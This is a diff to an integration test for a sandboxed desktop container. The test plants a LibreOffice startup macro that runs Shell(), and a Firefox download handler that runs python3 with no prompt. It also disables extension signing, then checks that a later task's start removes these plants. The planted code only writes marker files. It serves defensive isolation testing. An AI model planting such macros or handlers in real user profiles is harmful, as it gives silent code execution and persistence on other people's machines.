@@ -1,7 +1,7 @@
 import { execFileSync } from "node:child_process";
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 import { listDevices } from "@psyche/db";
 import type { PermissionBroker } from "@psyche/protocol";
 import { DesktopContainers } from "@psyche/sandbox";
@@ -39,6 +39,89 @@ const exec = (cmd: string): { code: number; out: string } => {
     const err = e as { status?: number; stdout?: string; stderr?: string };
     return { code: err.status ?? 1, out: `${err.stdout ?? ""}${err.stderr ?? ""}` };
   }
+};
+
+/** Writes `text` to `path` inside the container (as the app user), through base64. */
+const put = (path: string, text: string): void => {
+  const r = exec(`echo ${Buffer.from(text).toString("base64")} | /usr/bin/base64 -d > ${path}`);
+  if (r.code !== 0) throw new Error(`could not write ${path}: ${r.out}`);
+};
+const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
+
+/**
+ * Planted app state that runs a program, and the proof that it does: LibreOffice binds the
+ * application event OnStartApp to `macro:///` (which neither MacroSecurityLevel nor
+ * DisableMacrosExecution gates) and Firefox opens a MIME type with /usr/bin/python3 without asking.
+ * Each plant is first run in a profile that is read as planted (the control: it must run), then a
+ * later start must not run it.
+ */
+const LO_PROFILE = "/workspace/.config/libreoffice/4";
+const LO_MODULE = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">
+Sub AppStart
+  Dim f As Integer
+  f = FreeFile
+  Open "/workspace/lo-app-start-ran" For Output As #f
+  Print #f, "ran"
+  Close #f
+  Shell("/usr/bin/touch", 0, "/workspace/lo-shell-ran", True)
+End Sub
+</script:module>
+`;
+const LO_BINDING =
+  '<item oor:path="/org.openoffice.Office.Common/Security/Scripting"><prop oor:name="DisableMacrosExecution" oor:op="fuse"><value>false</value></prop></item>' +
+  '<item oor:path="/org.openoffice.Office.Events/ApplicationEvents/Bindings"><node oor:name="OnStartApp" oor:op="replace"><prop oor:name="BindingURL" oor:op="fuse"><value>macro:///Standard.Module1.AppStart</value></prop></node></item>';
+const soffice = (profile: string | null, doc: string) =>
+  exec(
+    `/usr/bin/timeout -s KILL 90 /usr/bin/soffice --headless --norestore ${
+      profile ? `-env:UserInstallation=file://${profile} ` : ""
+    }${doc}`,
+  );
+const LO_MARKERS = "/workspace/lo-app-start-ran /workspace/lo-shell-ran";
+
+const FF_PAYLOAD = "open('/workspace/ff-handler-ran','w').write('x')\n";
+const FF_PROXY = `import socket
+s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("127.0.0.1", 3128)); s.listen(50)
+body = b"${FF_PAYLOAD}"
+while True:
+    c, _ = s.accept(); c.settimeout(2)
+    try:
+        d = c.recv(4096).split(b"\r\n")[0]
+        if b"payload.invalid" in d:
+            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/x-psyche-probe\r\nContent-Disposition: attachment; filename=payload.py\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body) + body)
+        else:
+            c.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+    except Exception:
+        pass
+    c.close()
+`;
+const FF_HANDLERS = JSON.stringify({
+  defaultHandlersVersion: {},
+  isDownloadsImprovementsAlreadyMigrated: true,
+  mimeTypes: {
+    "application/x-psyche-probe": {
+      action: 2,
+      ask: false,
+      handlers: [{ name: "python3", path: "/usr/bin/python3" }],
+      extensions: ["py"],
+    },
+  },
+  schemes: {},
+});
+/** Opens the probe URL in Firefox's default profile, with a stand-in proxy that serves the type. */
+const firefoxFetchesPayload = async (): Promise<boolean> => {
+  put("/workspace/ff-proxy.py", FF_PROXY);
+  exec("nohup /usr/bin/python3 -I /workspace/ff-proxy.py > /dev/null 2>&1 &");
+  exec(
+    "DISPLAY=:1 nohup /usr/bin/firefox-esr --no-remote http://payload.invalid/x > /tmp/ff-probe.log 2>&1 &",
+  );
+  await sleep(20_000);
+  const ran = exec("test -e /workspace/ff-handler-ran && echo ran || echo clean").out.trim();
+  exec("/usr/bin/pkill -x 'firefox.*'; /usr/bin/pkill -x python3; rm -f /workspace/ff-handler-ran");
+  await sleep(2000);
+  return ran === "ran";
 };
 
 /** The broker's `get`, over cards this test approves as the owner would. */
@@ -227,6 +310,51 @@ describe.skipIf(!REAL)("a real separate desktop", () => {
       "clean",
     );
 
+    // LibreOffice: a profile planted at the default place before the fix, with an OnStartApp
+    // binding to a Basic macro that also runs Shell(). Control: read as the profile, it runs.
+    expect(
+      exec("mkdir -p /workspace/lo-docs && echo hello > /workspace/lo-docs/plain.txt").code,
+    ).toBe(0);
+    soffice(LO_PROFILE, "--terminate_after_init");
+    put(`${LO_PROFILE}/user/basic/Standard/Module1.xba`, LO_MODULE);
+    put("/workspace/lo-binding.xml", LO_BINDING);
+    expect(
+      exec(
+        `/usr/bin/python3 -I -c "import sys; f=sys.argv[1]; s=open(f).read(); open(f,'w').write(s.replace('</oor:items>', open(sys.argv[2]).read()+'</oor:items>'))" ${LO_PROFILE}/user/registrymodifications.xcu /workspace/lo-binding.xml`,
+      ).code,
+    ).toBe(0);
+    soffice(LO_PROFILE, "/workspace/lo-docs/plain.txt");
+    expect(
+      exec(`ls ${LO_MARKERS}`).out.split(/\s+/).filter(Boolean).sort(),
+      "control: the planted LibreOffice profile does run when it is read",
+    ).toEqual(LO_MARKERS.split(" ").sort());
+    exec(`rm -f ${LO_MARKERS}`);
+    // Firefox: a handler that runs python3 on a download, prefs that relax extension checks, an
+    // extension, userChrome, and a login that must survive. Control: it runs when read.
+    exec(
+      "DISPLAY=:1 nohup /usr/bin/firefox-esr --no-remote about:blank > /tmp/firefox-a.log 2>&1 &",
+    );
+    await sleep(12_000);
+    exec("/usr/bin/pkill -x 'firefox.*'");
+    await sleep(2000);
+    const profile = dirname(
+      exec(
+        "/usr/bin/find /workspace/.config/mozilla /workspace/.mozilla -name times.json 2>/dev/null | head -1",
+      ).out.trim(),
+    );
+    expect(profile, "Firefox created a profile in the workspace").toMatch(/^\/workspace\//);
+    put(`${profile}/handlers.json`, FF_HANDLERS);
+    put(`${profile}/user.js`, 'user_pref("xpinstall.signatures.required", false);\n');
+    put(`${profile}/logins.json`, '{"nextId":1,"logins":[]}');
+    expect(
+      exec(
+        `mkdir -p ${profile}/extensions ${profile}/chrome && echo x > ${profile}/extensions/x.xpi && echo x > ${profile}/chrome/userChrome.css`,
+      ).code,
+    ).toBe(0);
+    expect(await firefoxFetchesPayload(), "control: the planted handler runs python3").toBe(true);
+    // (the planted files must be back after the control run rewrote the profile)
+    put(`${profile}/handlers.json`, FF_HANDLERS);
+
     await sd.release("real-A", { force: true });
     expect(podman("ps", "--all", "--format", "{{.Names}}").trim()).toBe("");
 
@@ -292,17 +420,37 @@ describe.skipIf(!REAL)("a real separate desktop", () => {
     // init, which started it with the same environment, shows what it was given.)
     expect(homeOf("tini")).toContain("HOME=/workspace");
 
-    // The lockdown files are in place: Firefox extensions blocked, LibreOffice macros locked off.
+    // Firefox extensions are blocked by policy (root-owned, on the read-only image).
     expect(
       exec(
         'grep -c \'"installation_mode": "blocked"\' /etc/firefox/policies/policies.json',
       ).out.trim(),
     ).toBe("1");
+
+    // What task A planted in the app profiles did not survive the start, and does not run.
     expect(
-      exec(
-        "grep -c '<prop .*finalized=\"true\"' /usr/lib/libreoffice/share/registry/zz-psyche-lockdown.xcd",
-      ).out.trim(),
-    ).toBe("2");
+      exec("test -e /workspace/.config/libreoffice && echo still || echo gone").out.trim(),
+    ).toBe("gone");
+    soffice(null, "/workspace/lo-docs/plain.txt");
+    expect(
+      exec(`ls ${LO_MARKERS} 2>&1`).out,
+      "LibreOffice ran a macro from a profile planted by an earlier task",
+    ).not.toMatch(/lo-(app-start|shell)-ran\s*$/m);
+    expect(exec("test -d /tmp/lo-user/user && echo tmpfs || echo none").out.trim()).toBe("tmpfs");
+    expect(
+      exec("test -e /workspace/.config/libreoffice && echo still || echo gone").out.trim(),
+    ).toBe("gone");
+    const planted2 = exec(
+      "/usr/bin/find /workspace/.config/mozilla /workspace/.mozilla \\( -name handlers.json -o -name user.js -o -name 'extension*' -o -name chrome \\) 2>/dev/null",
+    ).out.trim();
+    expect(planted2, "planted Firefox handler/prefs/extension/userChrome files remain").toBe("");
+    expect(
+      exec("/usr/bin/find /workspace -name logins.json | head -1").out.trim(),
+      "logins are kept",
+    ).toMatch(/logins\.json$/);
+    expect(await firefoxFetchesPayload(), "Firefox ran a handler planted by an earlier task").toBe(
+      false,
+    );
 
     // A long-lived app opens on the display and keeps its profile in the workspace (Firefox ESR uses ~/.config/mozilla).
     exec("DISPLAY=:1 nohup /usr/bin/firefox-esr --no-remote about:blank > /tmp/firefox.log 2>&1 &");
@@ -339,5 +487,5 @@ describe.skipIf(!REAL)("a real separate desktop", () => {
       listDevices(t.gateway.context.db).some((d) => d.name.startsWith("Separate desktop")),
     ).toBe(false);
     expect(t.gateway.context.nodes.isLive(infoB.id)).toBe(false);
-  }, 300_000);
+  }, 900_000);
 });
